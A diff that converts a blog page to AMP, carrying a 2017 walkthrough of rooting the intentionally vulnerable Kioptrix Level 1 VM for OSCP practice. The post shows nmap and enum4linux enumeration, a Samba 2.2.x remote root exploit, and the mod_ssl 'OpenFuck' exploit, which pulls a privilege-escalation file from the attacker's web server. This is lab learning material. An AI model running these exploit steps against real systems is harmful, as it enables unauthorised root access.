@@ -1,28 +1,14 @@
 <!DOCTYPE html>
-<html>
+<html ⚡>
 <head>
-    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
-    <script>
-        // UNCOMMENT AND USE YOUR VARIABLES FOR DISQUS AND GOOGLE ANALYTICS
-        var d_id  = 'rootshellz',
-        //     g_id  = 'UA-XXXXXXXX-X', // Format: UA-########-#, Example: UA-11220899-1
-        //     g_url = 'XXXXXXX.XXX' // Format: #####.####, Example: webdesignporto.com
-    </script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
 
     <title>Kioptrix: Level 1 (#1) Walkthrough</title>
-
-    <meta name="HandheldFriendly" content="True" />
-    <meta name="MobileOptimized" content="320" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
-    <link rel="stylesheet" type="text/css" href="/assets/highlighter/prettify.css?v=8d33012fb0" />
-    <link rel="stylesheet" type="text/css" href="/assets/css/screen.css?v=8d33012fb0" />
 
     <link rel="icon" href="/favicon.png" type="image/png" />
     <link rel="canonical" href="https://blog.rootshellz.com/kioptrix-walkthrough-1/" />
     <meta name="referrer" content="no-referrer-when-downgrade" />
-    <link rel="amphtml" href="https://blog.rootshellz.com/kioptrix-walkthrough-1/amp/" />
     
     <meta property="og:site_name" content="rootshellz" />
     <meta property="og:type" content="article" />
@@ -99,64 +85,605 @@
 
     <meta name="generator" content="Ghost 3.36" />
     <link rel="alternate" type="application/rss+xml" title="rootshellz" href="https://blog.rootshellz.com/rss/" />
-    <!-- https://www.jsdelivr.com/package/npm/prism-themes?path=themes -->
-<!-- These three work together / are additive -->
-<link href="https://cdn.jsdelivr.net/npm/prism-themes@1.5.0/themes/prism-synthwave84.css" rel="stylesheet" / >
-<link href="https://cdn.jsdelivr.net/npm/prism-themes@1.5.0/themes/prism-vsc-dark-plus.css" rel="stylesheet" / >
-<link href="https://cdn.jsdelivr.net/npm/prism-themes@1.5.0/themes/prism-xonokai.css" rel="stylesheet" / >
 
+    <style amp-custom>
+    *,
+    *::before,
+    *::after {
+        box-sizing: border-box;
+    }
 
-<!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-TM0JKQZ7H1"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+    html {
+        overflow-x: hidden;
+        overflow-y: scroll;
+        font-size: 62.5%;
+        -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+    }
 
-  gtag('config', 'G-TM0JKQZ7H1');
-</script>
+    body {
+        min-height: 100vh;
+        margin: 0;
+        padding: 0;
+        color: #3a4145;
+        font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;
+        font-size: 1.7rem;
+        line-height: 1.55em;
+        font-weight: 400;
+        font-style: normal;
+        background: #fff;
+        scroll-behavior: smooth;
+        overflow-x: hidden;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+    }
 
-    <script>
-      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+    p,
+    ul,
+    ol,
+    li,
+    dl,
+    dd,
+    hr,
+    pre,
+    form,
+    table,
+    video,
+    figure,
+    figcaption,
+    blockquote {
+        margin: 0;
+        padding: 0;
+    }
 
-      ga('create', g_id, g_url);
-      ga('send', 'pageview');
+    ul[class],
+    ol[class] {
+        padding: 0;
+        list-style: none;
+    }
 
-    </script>
+    img {
+        display: block;
+        max-width: 100%;
+    }
+
+    input,
+    button,
+    select,
+    textarea {
+        font: inherit;
+        -webkit-appearance: none;
+    }
+
+    fieldset {
+        margin: 0;
+        padding: 0;
+        border: 0;
+    }
+
+    label {
+        display: block;
+        font-size: 0.9em;
+        font-weight: 700;
+    }
+
+    hr {
+        position: relative;
+        display: block;
+        width: 100%;
+        height: 1px;
+        border: 0;
+        border-top: 1px solid currentcolor;
+        opacity: 0.1;
+    }
+
+    ::selection {
+        text-shadow: none;
+        background: #cbeafb;
+    }
+
+    mark {
+        background-color: #fdffb6;
+    }
+
+    small {
+        font-size: 80%;
+    }
+
+    sub,
+    sup {
+        position: relative;
+        font-size: 75%;
+        line-height: 0;
+        vertical-align: baseline;
+    }
+    sup {
+        top: -0.5em;
+    }
+    sub {
+        bottom: -0.25em;
+    }
+
+    ul li + li {
+        margin-top: 0.6em;
+    }
+
+    a {
+        color: #1292EE;
+        text-decoration-skip-ink: auto;
+    }
+
+    h1,
+    h2,
+    h3,
+    h4,
+    h5,
+    h6 {
+        margin: 0;
+        font-weight: 700;
+        color: #121212;
+        line-height: 1.4em;
+    }
+
+    h1 {
+        font-size: 3.4rem;
+        line-height: 1.1em;
+    }
+
+    h2 {
+        font-size: 2.4rem;
+        line-height: 1.2em;
+    }
+
+    h3 {
+        font-size: 1.8rem;
+    }
+
+    h4 {
+        font-size: 1.7rem;
+    }
+
+    h5 {
+        font-size: 1.6rem;
+    }
+
+    h6 {
+        font-size: 1.6rem;
+    }
+
+    amp-img {
+        height: 100%;
+        width: 100%;
+        max-width: 100%;
+        max-height: 100%;
+    }
+
+    amp-img img {
+        object-fit: cover;
+    }
+
+    .page-header {
+        padding: 50px 5vmin 30px;
+        text-align: center;
+        font-size: 2rem;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+    }
+
+    .page-header a {
+        color: #121212;
+        font-weight: 700;
+        text-decoration: none;
+        font-size: 1.6rem;
+        letter-spacing: -0.1px;
+    }
+
+    .post {
+        max-width: 680px;
+        margin: 0 auto;
+    }
+
+    .post-header {
+        margin: 0 5vmin 5vmin;
+        text-align: center;
+    }
+
+    .post-meta {
+        margin: 1rem 0 0 0;
+        text-transform: uppercase;
+        color: #738a94;
+        font-weight: 500;
+        font-size: 1.3rem;
+    }
+
+    .post-image {
+        margin: 0 0 5vmin;
+    }
+
+    .post-image img {
+        display: block;
+        width: 100%;
+        height: auto;
+    }
+
+    .post-content {
+        padding: 0 5vmin;
+    }
+
+    .post-content > * + * {
+        margin-top: 1.5em;
+    }
+
+    .post-content [id]:not(:first-child) {
+        margin: 2em 0 0;
+    }
+
+    .post-content > [id] + * {
+        margin-top: 1rem;
+    }
+
+    .post-content [id] + .kg-card,
+    .post-content blockquote + .kg-card {
+        margin-top: 40px;
+    }
+
+    .post-content > ul,
+    .post-content > ol,
+    .post-content > dl {
+        padding-left: 1.9em;
+    }
+
+    .post-content hr {
+        margin-top: 40px;
+    }
+
+    .post .post-content hr + * {
+        margin-top: 40px;
+    }
+
+    .post-content amp-img {
+        background-color: #f8f8f8;
+    }
+
+    .post-content blockquote {
+        position: relative;
+        font-style: italic;
+    }
+
+    .post-content blockquote::before {
+        content: "";
+        position: absolute;
+        left: -1.5em;
+        top: 0;
+        bottom: 0;
+        width: 0.3rem;
+        background: #000;
+    }
+
+    .post-content :not(.kg-card):not([id]) + .kg-card {
+        margin-top: 40px;
+    }
+
+    .post-content .kg-card + :not(.kg-card) {
+        margin-top: 40px;
+    }
+
+    .kg-card figcaption {
+        padding: 1.5rem 1.5rem 0;
+        text-align: center;
+        font-weight: 500;
+        font-size: 1.3rem;
+        line-height: 1.4em;
+        opacity: 0.6;
+    }
+
+    .kg-card figcaption strong {
+        color: rgba(0,0,0,0.8);
+    }
+
+    .post-content :not(pre) code {
+        vertical-align: middle;
+        padding: 0.15em 0.4em 0.15em;
+        border: #e1eaef 1px solid;
+        font-weight: 400;
+        font-size: 0.9em;
+        line-height: 1em;
+        color: #dc0050;
+        background: #f0f6f9;
+        border-radius: 0.25em;
+    }
+
+    .post-content > pre {
+        overflow: scroll;
+        padding: 16px 20px;
+        color: #fff;
+        background: #1F2428;
+        border-radius: 5px;
+        box-shadow: 0 2px 6px -2px rgba(0,0,0,.1), 0 0 1px rgba(0,0,0,.4);
+    }
+
+    .kg-embed-card {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        width: 100%;
+    }
+
+    .kg-image-card img {
+        margin: auto;
+    }
+
+    .kg-gallery-card + .kg-gallery-card {
+        margin-top: 0.75em;
+    }
+
+    .kg-gallery-container {
+        position: relative;
+    }
+
+    .kg-gallery-row {
+        display: flex;
+        flex-direction: row;
+        justify-content: center;
+    }
+
+    .kg-gallery-image {
+        width: 100%;
+        height: 100%;
+    }
+
+    .kg-gallery-row:not(:first-of-type) {
+        margin: 0.75em 0 0 0;
+    }
+
+    .kg-gallery-image:not(:first-of-type) {
+        margin: 0 0 0 0.75em;
+    }
+
+    .kg-bookmark-card,
+    .kg-bookmark-publisher {
+        position: relative;
+    }
+
+    .kg-bookmark-container,
+    .kg-bookmark-container:hover {
+        display: flex;
+        flex-wrap: wrap;
+        flex-direction: row-reverse;
+        color: currentColor;
+        background: rgba(255,255,255,0.6);
+        font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;
+        text-decoration: none;
+        border-radius: 5px;
+        box-shadow: 0 2px 6px -2px rgba(0, 0, 0, 0.1), 0 0 1px rgba(0, 0, 0, 0.4);
+        overflow: hidden;
+    }
+
+    .kg-bookmark-content {
+        flex-basis: 0;
+        flex-grow: 999;
+        padding: 20px;
+        order: 1;
+    }
+
+    .kg-bookmark-title {
+        font-weight: 600;
+        font-size: 1.5rem;
+        line-height: 1.3em;
+    }
+
+    .kg-bookmark-description {
+        display: -webkit-box;
+        max-height: 45px;
+        margin: 0.5em 0 0 0;
+        font-size: 1.4rem;
+        line-height: 1.55em;
+        overflow: hidden;
+        opacity: 0.8;
+        -webkit-line-clamp: 2;
+        -webkit-box-orient: vertical;
+    }
+
+    .kg-bookmark-metadata {
+        margin-top: 20px;
+    }
+
+    .kg-bookmark-metadata {
+        display: flex;
+        align-items: center;
+        font-weight: 500;
+        font-size: 1.3rem;
+        line-height: 1.3em;
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+    }
+
+    .kg-bookmark-description {
+        display: -webkit-box;
+        -webkit-box-orient: vertical;
+        -webkit-line-clamp: 2;
+        overflow: hidden;
+    }
+
+    .kg-bookmark-metadata amp-img {
+        width: 18px;
+        height: 18px;
+        max-width: 18px;
+        max-height: 18px;
+        margin-right: 10px;
+    }
+
+    .kg-bookmark-thumbnail {
+        display: flex;
+        flex-basis: 20rem;
+        flex-grow: 1;
+        justify-content: flex-end;
+    }
+
+    .kg-bookmark-thumbnail amp-img {
+        max-height: 200px;
+    }
+
+    .kg-bookmark-author {
+        white-space: nowrap;
+        text-overflow: ellipsis;
+        overflow: hidden;
+    }
+
+    .kg-bookmark-publisher::before {
+        content: "•";
+        margin: 0 .5em;
+    }
+
+    .kg-width-full.kg-card-hascaption {
+        display: grid;
+        grid-template-columns: inherit;
+    }
+
+    .post-content table {
+        border-collapse: collapse;
+        width: 100%;
+    }
+
+    .post-content th {
+        padding: 0.5em 0.8em;
+        text-align: left;
+        font-size: .75em;
+        text-transform: uppercase;
+    }
+
+    .post-content td {
+        padding: 0.4em 0.7em;
+    }
+
+    .post-content tbody tr:nth-child(2n + 1) {
+        background-color: rgba(0,0,0,0.1);
+        padding: 1px;
+    }
+
+    .post-content tbody tr:nth-child(2n + 2) td:last-child {
+        box-shadow:
+            inset 1px 0 rgba(0,0,0,0.1),
+            inset -1px 0 rgba(0,0,0,0.1);
+    }
+
+    .post-content tbody tr:nth-child(2n + 2) td {
+        box-shadow: inset 1px 0 rgba(0,0,0,0.1);
+    }
+
+    .post-content tbody tr:last-child {
+        border-bottom: 1px solid rgba(0,0,0,.1);
+    }
+
+    .page-footer {
+        padding: 60px 5vmin;
+        margin: 60px auto 0;
+        text-align: center;
+        background-color: #f8f8f8;
+    }
+
+    .page-footer h3 {
+        margin: 0.5rem 0 0 0;
+    }
+
+    .page-footer p {
+        max-width: 500px;
+        margin: 1rem auto 1.5rem;
+        font-size: 1.7rem;
+        line-height: 1.5em;
+        color: rgba(0,0,0,0.6)
+    }
+
+    .powered {
+        display: inline-flex;
+        align-items: center;
+        margin: 30px 0 0;
+        padding: 6px 9px 6px 6px;
+        border: rgba(0,0,0,0.1) 1px solid;
+        font-size: 12px;
+        line-height: 12px;
+        letter-spacing: -0.2px;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
+        font-weight: 500;
+        color: #222;
+        text-decoration: none;
+        background: #fff;
+        border-radius: 6px;
+    }
+
+    .powered svg {
+        height: 16px;
+        width: 16px;
+        margin: 0 6px 0 0;
+    }
+
+    @media (max-width: 600px) {
+        body {
+            font-size: 1.6rem;
+        }
+        h1 {
+            font-size: 3rem;
+        }
+
+        h2 {
+            font-size: 2.2rem;
+        }
+    }
+
+    @media (max-width: 400px) {
+        h1 {
+            font-size: 2.6rem;
+            line-height: 1.15em;
+        }
+        h2 {
+            font-size: 2rem;
+            line-height: 1.2em;
+        }
+        h3 {
+            font-size: 1.7rem;
+        }
+    }
+    </style>
+
+    <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
+    <script async src="https://cdn.ampproject.org/v0.js"></script>
+
+    <script async custom-element="amp-analytics" src="https://cdn.ampproject.org/v0/amp-analytics-0.1.js"></script>
+
 </head>
-<body class="post-template tag-boot2root tag-vulnhub tag-oscp tag-kioptrix">
 
-    
+<body class="amp-template">
+    <header class="page-header">
+        <a href="https://blog.rootshellz.com">
+                <amp-img class="site-icon" src="https://blog.rootshellz.com/content/images/2020/11/Blog-Logo.png" width="50" height="50" layout="fixed"></amp-img>
+        </a>
+    </header>
 
-<main class="content" role="main">
+    <main class="content" role="main">
+        <article class="post">
 
-    <article class="post tag-boot2root tag-vulnhub tag-oscp tag-kioptrix">
+            <header class="post-header">
+                <h1 class="post-title">Kioptrix: Level 1 (#1) Walkthrough</h1>
+                <section class="post-meta">
+                    rootshellz -
+                    <time class="post-date" datetime="2017-08-15">15 Aug 2017</time>
+                </section>
+            </header>
+            <figure class="post-image">
+                <amp-img src="https://blog.rootshellz.com/content/images/2018/07/Kioptrix-1-Cover.jpg" width="600" height="340" layout="responsive"></amp-img>
+            </figure>
+            <section class="post-content">
 
-        <header class="post-header">
-            <a id="blog-logo" href="https://blog.rootshellz.com">
-                    <img src="/content/images/2018/07/Blog-Logo.png" alt="Blog Logo" />
-            </a>
-        </header>
-
-
-        <span class="post-meta"><time datetime="2017-08-15">15 Aug 2017</time> on <a href="/tag/boot2root/">Boot2Root</a> | <a href="/tag/vulnhub/">VulnHub</a> | <a href="/tag/oscp/">OSCP</a> | <a href="/tag/kioptrix/">Kioptrix</a></span>
-
-        <h1 class="post-title">Kioptrix: Level 1 (#1) Walkthrough</h1>
-
-        <section class="post-content">
-            <!--kg-card-begin: markdown--><h1 id="intro">Intro</h1>
+                <h1 id="intro">Intro</h1>
 <p><a href="https://www.defcon.org/html/defcon-25/dc-25-index.html">Defcon 25</a> is in the books and my <a href="https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/">Penetration Testing Training with Kali Linux (PWK)</a> / <a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/">Offensive Security Certified Professional (OSCP)</a> lab time is up.  I now have a bit of extra time but I also want to keep my forward momentum in the land of pwning boxes...  Accordingly, this seems like an opportune time to start posting, and what better topic than gaining root shellz?</p>
 <p>I went in search of pwnables that were similar to the boxes I experienced in the PWK lab and found the <a href="http://www.kioptrix.com/blog/test-page/">Kioptrix</a> series of VMs recommended.  The series is also on <a href="https://www.vulnhub.com/series/kioptrix,8/">VulnHub</a>.  Kioptrix consists of five machines, each of increasing difficulty.  The challenges appear to be a bit older, but still seem relevant.</p>
 <p>For those that don't know, a pwnable or Boot2Root is an intentionally vulnerable virtual machine (VM) that provides a challenge to hackers.  The goal is usually to root the box.  Some challenges have an intended solution and guide you down the correct path, others expect you to attack the box by any means necessary.</p>
-<p>Let's get started with the first box.  I downloaded the .rar file, decompressed it, and spun up the VM in <a href="https://www.vmware.com/products/fusion.html">VMware Fusion</a>.  After booting, I was presented with the following screen:<br>
-<img src="https://blog.rootshellz.com/content/images/2017/08/Kioptrix1-VM-Console.png" alt="Kioptrix1-VM-Console"></p>
+<p>Let's get started with the first box.  I downloaded the .rar file, decompressed it, and spun up the VM in <a href="https://www.vmware.com/products/fusion.html">VMware Fusion</a>.  After booting, I was presented with the following screen:<br />
+</p>
 <h1 id="scanningandenumeration">Scanning and Enumeration</h1>
 <h2 id="identifyingtargetaddressdhcp">Identifying Target Address (DHCP)</h2>
 <p>The host grabs an address via DHCP as it boots.  Identifying the host on my network was simple as the VM is in a low traffic local subnet on my host machine.</p>
-<pre><code class="language-shell-output">root@kali:~# ifconfig eth1 | grep &quot;inet\s&quot;
+<pre><code class="language-shell-output">root@kali:~# ifconfig eth1 | grep "inet\s"
 inet 172.16.2.129  netmask 255.255.255.0  broadcast 172.16.2.255
 </code></pre>
 <pre><code class="language-shell-output">root@kali:~# nmap -T4 -sn 172.16.2.0/24
@@ -194,26 +721,26 @@ PORT      STATE SERVICE     VERSION
 45295/tcp open  unknown
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
 SF-Port45295-TCP:V=7.25BETA2%I=7%D=8/12%Time=598EC8C9%P=i686-pc-linux-gnu%
-SF:r(GenericLines,3E,&quot;/bin//sh:\x20\r:\x20command\x20not\x20found\n/bin//s
-SF:h:\x20\r:\x20command\x20not\x20found\n&quot;)%r(GetRequest,1FD,&quot;Can't\x20ign
+SF:r(GenericLines,3E,"/bin//sh:\x20\r:\x20command\x20not\x20found\n/bin//s
+SF:h:\x20\r:\x20command\x20not\x20found\n")%r(GetRequest,1FD,"Can't\x20ign
 SF:ore\x20signal\x20CHLD,\x20forcing\x20to\x20default\.\nUse\x20of\x20unin
 SF:itialized\x20value\x20in\x20pattern\x20match\x20\(m//\)\x20at\x20/usr/l
 SF:ib/perl5/site_perl/5\.6\.0/URI/Heuristic\.pm\x20line\x2097\.\n&lt;HTML&gt;\n&lt;
 SF:HEAD&gt;&lt;TITLE&gt;An\x20Error\x20Occurred&lt;/TITLE&gt;&lt;/HEAD&gt;\n&lt;BODY&gt;\n&lt;H1&gt;An\x20E
-SF:rror\x20Occurred&lt;/h1&gt;\n500\x20Can't\x20locate\x20object\x20method\x20\&quot;
-SF:epath\&quot;\x20via\x20package\x20\&quot;URI::file\&quot;\n\n&lt;/BODY&gt;\n&lt;/HTML&gt;\n&lt;HTML&gt;\
+SF:rror\x20Occurred&lt;/h1&gt;\n500\x20Can't\x20locate\x20object\x20method\x20\"
+SF:epath\"\x20via\x20package\x20\"URI::file\"\n\n&lt;/BODY&gt;\n&lt;/HTML&gt;\n&lt;HTML&gt;\
 SF:n&lt;HEAD&gt;&lt;TITLE&gt;An\x20Error\x20Occurred&lt;/TITLE&gt;&lt;/HEAD&gt;\n&lt;BODY&gt;\n&lt;H1&gt;An\x2
 SF:0Error\x20Occurred&lt;/h1&gt;\n500\x20Can't\x20connect\x20to\x20HTTP:80\x20\(
 SF:Bad\x20hostname\x20'HTTP'\)\n\n&lt;/BODY&gt;\n&lt;/HTML&gt;\n/bin//sh:\x20\r:\x20co
-SF:mmand\x20not\x20found\n&quot;)%r(HTTPOptions,44,&quot;/bin//sh:\x20OPTIONS:\x20co
-SF:mmand\x20not\x20found\n/bin//sh:\x20\r:\x20command\x20not\x20found\n&quot;)%
-SF:r(RTSPRequest,44,&quot;/bin//sh:\x20OPTIONS:\x20command\x20not\x20found\n/bi
-SF:n//sh:\x20\r:\x20command\x20not\x20found\n&quot;)%r(Help,23,&quot;/bin//sh:\x20HE
-SF:LP\r:\x20command\x20not\x20found\n&quot;)%r(TLSSessionReq,4F,&quot;/bin//sh:\x20\
+SF:mmand\x20not\x20found\n")%r(HTTPOptions,44,"/bin//sh:\x20OPTIONS:\x20co
+SF:mmand\x20not\x20found\n/bin//sh:\x20\r:\x20command\x20not\x20found\n")%
+SF:r(RTSPRequest,44,"/bin//sh:\x20OPTIONS:\x20command\x20not\x20found\n/bi
+SF:n//sh:\x20\r:\x20command\x20not\x20found\n")%r(Help,23,"/bin//sh:\x20HE
+SF:LP\r:\x20command\x20not\x20found\n")%r(TLSSessionReq,4F,"/bin//sh:\x20\
 SF:x16\x03i\x01e\x03\x03U\x1c\xa7\xe4random1random2random3random4\x0c/:\x2
-SF:0No\x20such\x20file\x20or\x20directory\n&quot;)%r(Kerberos,2E,&quot;/bin//sh:\x20
+SF:0No\x20such\x20file\x20or\x20directory\n")%r(Kerberos,2E,"/bin//sh:\x20
 SF:qj\x81n0\x81k\xa1\x03\x02\x01\x05\xa2\x03\x02\x01:\x20command\x20not\x2
-SF:0found\n&quot;)%r(FourOhFourRequest,1F4,&quot;Can't\x20ignore\x20signal\x20CHLD,\
+SF:0found\n")%r(FourOhFourRequest,1F4,"Can't\x20ignore\x20signal\x20CHLD,\
 SF:x20forcing\x20to\x20default\.\nUse\x20of\x20uninitialized\x20value\x20i
 SF:n\x20pattern\x20match\x20\(m//\)\x20at\x20/usr/lib/perl5/site_perl/5\.6
 SF:\.0/URI/Heuristic\.pm\x20line\x2097\.\n&lt;HTML&gt;\n&lt;HEAD&gt;&lt;TITLE&gt;An\x20Error
@@ -222,7 +749,7 @@ SF:404\x20File\x20`/nice\x20ports,/Trinity\.txt\.bak'\x20does\x20not\x20ex
 SF:ist\n&lt;/BODY&gt;\n&lt;/HTML&gt;\n&lt;HTML&gt;\n&lt;HEAD&gt;&lt;TITLE&gt;An\x20Error\x20Occurred&lt;/TI
 SF:TLE&gt;&lt;/HEAD&gt;\n&lt;BODY&gt;\n&lt;H1&gt;An\x20Error\x20Occurred&lt;/h1&gt;\n500\x20Can't\x20
 SF:connect\x20to\x20HTTP:80\x20\(Bad\x20hostname\x20'HTTP'\)\n\n&lt;/BODY&gt;\n&lt;
-SF:/HTML&gt;\n/bin//sh:\x20\r:\x20command\x20not\x20found\n&quot;);
+SF:/HTML&gt;\n/bin//sh:\x20\r:\x20command\x20not\x20found\n");
 MAC Address: 00:0C:29:E8:BF:7E (VMware)
 Device type: general purpose
 Running: Linux 2.4.X
@@ -256,7 +783,7 @@ Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux
 enum4linux complete on Fri Aug 11 22:42:00 2017
 </code></pre>
 <p>Ahh, there's the version: Samba <em>2.2.1a</em>, which I then ran through Exploit DB:</p>
-<pre><code class="language-shell-output">root@kali:~# searchsploit Samba | grep &quot;2\.2\.&quot;
+<pre><code class="language-shell-output">root@kali:~# searchsploit Samba | grep "2\.2\."
 Samba 2.2.x - Remote Root Buffer Overflow                            | ./linux/remote/7.pl
 [... snip ...]
 </code></pre>
@@ -286,11 +813,11 @@ Samba 2.2.x - Remote Root Buffer Overflow                            | ./linux/r
 root@kali:~#
 </code></pre>
 <p>Unfortunately, after running through the address brute-force, this exploit script did not seem to do the trick.</p>
-<p>I was still convinced that this vulnerability was exploitable, so I went looking for another working exploit.  I simply Googled &quot;Samba 2.2.1a&quot; and my first hit was for an exploit actually labeled Samba 2.2.<em>8</em>, but stated, &quot;Remote root exploit for Samba 2.2.x and prior that works against Linux (all distributions) [...].&quot;</p>
-<p><img src="https://blog.rootshellz.com/content/images/2017/08/Google-Samba-2.2.1a.png" alt="Google-Samba-2.2.1a"></p>
+<p>I was still convinced that this vulnerability was exploitable, so I went looking for another working exploit.  I simply Googled "Samba 2.2.1a" and my first hit was for an exploit actually labeled Samba 2.2.<em>8</em>, but stated, "Remote root exploit for Samba 2.2.x and prior that works against Linux (all distributions) [...]."</p>
+<p></p>
 <p>As a side note, this exploit labeling makes it difficult to identify this exploit with the searchsploit tool.  If anyone know how to better use searchsploit, let me know.</p>
 <p>At any rate, I located, compiled, and ran the exploit:</p>
-<pre><code class="language-shell-output">root@kali:~# searchsploit &quot;Samba 2.2.8&quot;
+<pre><code class="language-shell-output">root@kali:~# searchsploit "Samba 2.2.8"
 ------------------------------------------------------------------------------------------------------------------- ----------------------------------
  Exploit Title                                                                                                     |  Path
                                                                                                                    | (/usr/share/exploitdb/platforms)
@@ -338,7 +865,7 @@ whoami
 root
 </code></pre>
 <p>Boom, rootshellz!  At this point, instead of moving on to persistence and pilfering the box, I instead wanted to see if I could find any other ways to pwn Kioptrix1.</p>
-<p>Unfamiliar with &quot;JE MOET JE MUIL HOUWE,&quot; I found it is Dutch for &quot;YOU MUST HAVE YOUR MOUSE.&quot;  It is also, apparently, a <a href="https://www.youtube.com/watch?v=BcpirI2BcWI">hardcore song by Neophyte</a>.  If there is some further reference here, it is lost on me.</p>
+<p>Unfamiliar with "JE MOET JE MUIL HOUWE," I found it is Dutch for "YOU MUST HAVE YOUR MOUSE."  It is also, apparently, a <a href="https://www.youtube.com/watch?v=BcpirI2BcWI">hardcore song by Neophyte</a>.  If there is some further reference here, it is lost on me.</p>
 <h1 id="exploitation2apacheandmod_ssl">Exploitation #2 - Apache and mod_ssl</h1>
 <p>Searching for Apache and mod_ssl vulnerabilities / exploits turned up a promising hit:</p>
 <pre><code class="language-shell-output">root@kali:~# searchsploit apache mod_ssl
@@ -462,7 +989,7 @@ root@kali:~# gcc -o OpenFuckIn2017LocalDL OpenFuckIn2017LocalDL.c -lcrypto
 </code></pre>
 <pre><code class="language-shell-output">root@kali:~# python -m SimpleHTTPServer
 Serving HTTP on 0.0.0.0 port 8000 ...
-172.16.2.130 - - [13/Aug/2017 11:03:20] &quot;GET /ptrace-kmod.c HTTP/1.0&quot; 200 -
+172.16.2.130 - - [13/Aug/2017 11:03:20] "GET /ptrace-kmod.c HTTP/1.0" 200 -
 </code></pre>
 <pre><code class="language-shell-output">root@kali:~# ./OpenFuckIn2017LocalDL 0x6b 172.16.2.130
 
@@ -622,68 +1149,37 @@ Subject: LogWatch for kioptrix.level1
  ###################### LogWatch End ######################### 
 </code></pre>
 <p>Looks like this was a flag:</p>
-<p>&quot;If you are reading this, you got root. Congratulations.<br>
-Level 2 won't be as easy...&quot;</p>
+<p>"If you are reading this, you got root. Congratulations.<br />
+Level 2 won't be as easy..."</p>
 <h1 id="conclusion">Conclusion</h1>
 <p>This VM was simple and fun, a nice warm up for the Kioptrix series.  I was able to find two different RCE vulnerabilities, one in SMB and the other in mod_ssl / Apache.  I think the moral here, from a security standpoint, is patch all the things!  Stay tuned as I will continue to post about the Kioptrix series as I complete them.</p>
 <p>Also, in a future posts, I plan to dig deeper in to the exploits used in this and other challenges to really understand the vulnerabilities and how the exploits actually work.</p>
-<!--kg-card-end: markdown-->
-        </section>
-        
-        <div id="disqus_thread"></div>
-        <script type="text/javascript">
-            var disqus_shortname = d_id; 
-        
-            /* * * DON'T EDIT BELOW THIS LINE * * */
-            (function() {
-                var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-                dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-            })();
-        </script>
-        <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-        <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-        
-
-        <footer class="post-footer">
 
 
-            <section class="share">
-                <h4>Share this</h4>
-                <a class="icon-twitter" href="http://twitter.com/share?text=Kioptrix: Level 1 (#1) Walkthrough&url=https://blog.rootshellz.com/kioptrix-walkthrough-1/"
-                    onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
-                    <span class="hidden">Twitter</span>
-                </a>
-                <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.rootshellz.com/kioptrix-walkthrough-1/"
-                    onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
-                    <span class="hidden">Facebook</span>
-                </a>
-                <a class="icon-google-plus" href="https://plus.google.com/share?url=https://blog.rootshellz.com/kioptrix-walkthrough-1/"
-                   onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
-                    <span class="hidden">Google+</span>
-                </a>
             </section>
 
-        </footer>
-
-
-    </article>
-
-</main>
-
-
-    <footer class="site-footer">
-        <!-- <a class="subscribe icon-feed" href="https://blog.rootshellz.com/rss/"><span class="tooltip">Subscribe!</span></a> -->
-        <div class="inner">
-             <section class="copyright">All content copyright <a href="/">rootshellz</a> &copy; 2020 &bull; All rights reserved.</section>
